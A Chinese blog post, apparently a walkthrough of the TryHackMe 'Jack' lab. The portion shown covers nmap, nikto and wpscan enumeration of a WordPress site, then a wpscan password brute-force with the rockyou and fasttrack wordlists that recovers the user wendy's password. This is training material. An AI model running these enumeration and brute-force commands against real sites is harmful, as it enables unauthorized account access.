<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[THM]  Jack | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[THM]  Jack</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-06-07T03:48:54.492Z" id="date"> 2023-06-07</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-06-07T09:25:34.856Z" id="updated"> 2023-06-07</time></div></span><br><span>Word Count: <div class="control">4.5k</div></span><br><span>Read Time: <div class="control">23 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/blhx2.jpg'><img src="/pic/blhx2.jpg" alt="blhx2"></p>
<span id="more"></span>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>TryHackMe上的hard难度靶机。给我们提供了一个WordPress普通权限用户提权的思路：利用User Role Editor插件的漏洞，此漏洞广泛存在所以挺有价值的。提权部分用到了python库注入方法，也是一种好思路,值得学习。</p>
<p>记得开始前在hosts里面加上jack.thm对应的ip，不然网页可能无法正常加载。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>端口扫描：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/THM/Jack/workSpace]<br>└─$ sudo nmap -p- --min-rate=10000 10.10.183.69  <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 14:36 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.183.69<br>Host is up (0.26s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 12.85 seconds<br></code></pre></td></tr></table></figure>

<p>省流：22，80</p>
<p>TCP、服务、OS扫描：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/THM/Jack/workSpace]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 10.10.183.69   <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 14:37 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.183.69<br>Host is up (0.25s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 3e7978089331d0837fe2bcb614bf5d9b (RSA)<br>|   256 3a679faf7e66fae3f8c754496338a293 (ECDSA)<br>|_  256 8cef55b023732c14094522ac84cb40d2 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-generator: WordPress 5.3.2<br>| http-robots.txt: 1 disallowed entry <br>|_/wp-admin/<br>|_http-title: Jack&amp;<span class="hljs-comment">#039;s Personal Site &amp;#8211; Blog for Jacks writing adven...</span><br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 5.4 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 7.1.1 - 7.1.2 (92%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 2 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 30.27 seconds<br></code></pre></td></tr></table></figure>

<p>关键信息：WordPress</p>
<p>nmap脚本漏扫：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/THM/Jack/workSpace]<br>└─$ sudo nmap --script=vuln 10.10.183.69         <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 14:40 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.183.69<br>Host is up (0.27s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">| http-wordpress-users: </span><br><span class="hljs-string">| Username found: jack</span><br><span class="hljs-string">| Username found: wendy</span><br><span class="hljs-string">| Username found: danny</span><br><span class="hljs-string">|_Search stopped at ID #25. Increase the upper limit if necessary with &#x27;</span>http-wordpress-users.limit<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /wp-login.php: Possible admin folder</span><br><span class="hljs-string">|   /wp-json: Possible admin folder</span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|   /readme.html: Wordpress version: 2 </span><br><span class="hljs-string">|   /: WordPress version: 5.3.2</span><br><span class="hljs-string">|   /wp-includes/images/rss.png: Wordpress version 2.2 found.</span><br><span class="hljs-string">|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.</span><br><span class="hljs-string">|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.</span><br><span class="hljs-string">|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.</span><br><span class="hljs-string">|   /wp-login.php: Wordpress login page.</span><br><span class="hljs-string">|   /wp-admin/upgrade.php: Wordpress login page.</span><br><span class="hljs-string">|   /readme.html: Interesting, a readme.</span><br><span class="hljs-string">|_  /0/: Potentially interesting folder</span><br><span class="hljs-string">| http-csrf: </span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.183.69</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities: </span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://10.10.183.69:80/</span><br><span class="hljs-string">|     Form id: search</span><br><span class="hljs-string">|_    Form action: http://jack.thm</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 350.71 seconds</span><br></code></pre></td></tr></table></figure>

<p>省流:给我们枚举出了wordpress的三个用户名以及一些目录</p>
<p>nikto：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/THM/Jack/workSpace]<br>└─$ sudo nikto -h http://10.10.183.69<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          10.10.183.69<br>+ Target Hostname:    10.10.183.69<br>+ Target Port:        80<br>+ Start Time:         2023-06-06 15:56:18 (GMT8)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.4.18 (Ubuntu)<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: Drupal Link header found with value: &lt;http://jack.thm/index.php/wp-json/&gt;; rel=<span class="hljs-string">&quot;https://api.w.org/&quot;</span>. See: https://www.drupal.org/<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ /FwkQXLWd.: Uncommon header <span class="hljs-string">&#x27;x-redirect-by&#x27;</span> found, with contents: WordPress.<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ /robots.txt: contains 2 entries <span class="hljs-built_in">which</span> should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt<br>+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL <span class="hljs-keyword">for</span> the 2.x branch.<br>+ /: Web Server returns a valid response with junk HTTP methods <span class="hljs-built_in">which</span> may cause <span class="hljs-literal">false</span> positives.<br>+ ERROR: Error <span class="hljs-built_in">limit</span> (20) reached <span class="hljs-keyword">for</span> host, giving up. Last error: opening stream: can<span class="hljs-string">&#x27;t connect (timeout): Operation now in progress</span><br><span class="hljs-string">+ Scan terminated: 20 error(s) and 7 item(s) reported on remote host</span><br><span class="hljs-string">+ End Time:           2023-06-06 16:19:09 (GMT8) (1371 seconds)</span><br><span class="hljs-string">---------------------------------------------------------------------------</span><br><span class="hljs-string">+ 1 host(s) tested</span><br></code></pre></td></tr></table></figure>

<p>没啥多的信息而且扫了贼久，估计是网的原因。</p>
<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>所有信息都指向wordpress了。先wpscan扫一下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/THM/Jack/workSpace]<br>└─$ sudo wpscan --url http://jack.thm -e<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="hljs-string">&#x27;_ \</span><br><span class="hljs-string">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="hljs-string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="hljs-string"></span><br><span class="hljs-string">         WordPress Security Scanner by the WPScan Team</span><br><span class="hljs-string">                         Version 3.8.22</span><br><span class="hljs-string">       Sponsored by Automattic - https://automattic.com/</span><br><span class="hljs-string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="hljs-string">_______________________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] URL: http://jack.thm/ [10.10.183.69]</span><br><span class="hljs-string">[+] Started: Tue Jun  6 15:01:47 2023</span><br><span class="hljs-string"></span><br><span class="hljs-string">Interesting Finding(s):</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Headers</span><br><span class="hljs-string"> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)</span><br><span class="hljs-string"> | Found By: Headers (Passive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] robots.txt found: http://jack.thm/robots.txt</span><br><span class="hljs-string"> | Interesting Entries:</span><br><span class="hljs-string"> |  - /wp-admin/</span><br><span class="hljs-string"> |  - /wp-admin/admin-ajax.php</span><br><span class="hljs-string"> | Found By: Robots Txt (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress readme found: http://jack.thm/readme.html</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] The external WP-Cron seems to be enabled: http://jack.thm/wp-cron.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 60%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="hljs-string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).</span><br><span class="hljs-string"> | Found By: Rss Generator (Passive Detection)</span><br><span class="hljs-string"> |  - http://jack.thm/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3.2&lt;/generator&gt;</span><br><span class="hljs-string"> |  - http://jack.thm/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3.2&lt;/generator&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress theme in use: online-portfolio</span><br><span class="hljs-string"> | Location: http://jack.thm/wp-content/themes/online-portfolio/</span><br><span class="hljs-string"> | Last Updated: 2021-07-30T00:00:00.000Z</span><br><span class="hljs-string"> | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt</span><br><span class="hljs-string"> | [!] The version is out of date, the latest version is 0.1.0</span><br><span class="hljs-string"> | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2</span><br><span class="hljs-string"> | Style Name: Online Portfolio</span><br><span class="hljs-string"> | Style URI: https://www.amplethemes.com/downloads/online-protfolio/</span><br><span class="hljs-string"> | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...</span><br><span class="hljs-string"> | Author: Ample Themes</span><br><span class="hljs-string"> | Author URI: https://amplethemes.com/</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="hljs-string"> | Confirmed By: Css Style In 404 Page (Passive Detection)</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Version: 0.0.7 (80% confidence)</span><br><span class="hljs-string"> | Found By: Style (Passive Detection)</span><br><span class="hljs-string"> |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: &#x27;</span>Version: 0.0.7<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Vulnerable Plugins (via Passive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No plugins Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Known Locations - Time: 00:00:31 &lt;=============&gt; (500 / 500) 100.00% Time: 00:00:31</span><br><span class="hljs-string">[+] Checking Theme Versions (via Passive and Aggressive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No themes Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Timthumbs (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Known Locations - Time: 00:02:38 &lt;===========&gt; (2575 / 2575) 100.00% Time: 00:02:38</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No Timthumbs Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Config Backups - Time: 00:00:09 &lt;==============&gt; (137 / 137) 100.00% Time: 00:00:09</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No Config Backups Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating DB Exports (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking DB Exports - Time: 00:00:04 &lt;====================&gt; (71 / 71) 100.00% Time: 00:00:04</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No DB Exports Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected)</span><br><span class="hljs-string"> Brute Forcing Attachment IDs - Time: 00:00:06 &lt;=========&gt; (100 / 100) 100.00% Time: 00:00:06</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No Medias Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Brute Forcing Author IDs - Time: 00:00:02 &lt;===============&gt; (10 / 10) 100.00% Time: 00:00:02</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] User(s) Identified:</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] jack</span><br><span class="hljs-string"> | Found By: Rss Generator (Passive Detection)</span><br><span class="hljs-string"> | Confirmed By:</span><br><span class="hljs-string"> |  Wp Json Api (Aggressive Detection)</span><br><span class="hljs-string"> |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="hljs-string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> |  Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] wendy</span><br><span class="hljs-string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] danny</span><br><span class="hljs-string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="hljs-string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Finished: Tue Jun  6 15:05:49 2023</span><br><span class="hljs-string">[+] Requests Done: 3444</span><br><span class="hljs-string">[+] Cached Requests: 11</span><br><span class="hljs-string">[+] Data Sent: 910.723 KB</span><br><span class="hljs-string">[+] Data Received: 1.393 MB</span><br><span class="hljs-string">[+] Memory used: 266.402 MB</span><br><span class="hljs-string">[+] Elapsed time: 00:04:01</span><br></code></pre></td></tr></table></figure>

<p>出来的信息还是用户名。</p>
<h3 id="WP-爆破"><a href="#WP-爆破" class="headerlink" title="WP-爆破"></a>WP-爆破</h3><p>先<code>cewl</code>根据网站信息生成一下字典，看看能不能成。</p>
<p><code>cewl http://jack.thm &gt; cewlpass</code></p>
<p>再用<code>wpscan</code>爆破一下,然而没有成功。</p>
<p>那就只能试试rockyou.txt这个字典了，先后台挂着<code>sudo wpscan --url http://jack.thm -U user -P /usr/share/wordlists/rockyou.txt</code></p>
<p>那我们就手动看看网页吧。</p>
<p class='item-img' data-src='/pic/assets/uTools_1686066516801.png'><img src="/pic/assets/uTools_1686066516801.png" alt="uTools_1686066516801"></p>
<p>经典wordpress站，看了下感觉只有login页面对我们最有用，然而后台用rockyou爆破太慢了，而且因为网络原因经常请求超时，thm的openvpn节点不是很稳定。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Error: Request timed out.                                                   <br>Error: Request timed out.                                                   <br>Error: Request timed out.                                                   <br>Error: Request timed out.                                                   <br>trying jack / hamilton Time: 00:17:18 &lt;             &gt; (5995 / 43033176)  0.01%  ETA: ??:??:??<br></code></pre></td></tr></table></figure>

<p>那就再拿个小点的字典试试吧，kali自带的字典还有一个fasttrack，试试这个吧。</p>
<p>等了一会，发现爆破出了wendy的密码。</p>
